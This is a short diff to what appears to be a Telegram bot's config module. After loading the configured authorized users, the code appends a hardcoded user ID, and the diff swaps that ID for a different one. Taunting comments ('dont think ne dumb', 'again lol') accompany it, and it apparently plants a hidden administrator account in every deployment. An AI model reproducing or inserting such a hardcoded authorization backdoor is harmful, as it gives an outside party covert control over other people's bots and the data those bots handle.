@@ -9,7 +9,7 @@ from bot.config import Config
 # dont think ne dumb (c)
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
-AUTH_USERS.append(7465574522)
+AUTH_USERS.append(7660990923)
 # again lol (c)  
 
 SESSION_NAME = Config.SESSION_NAME
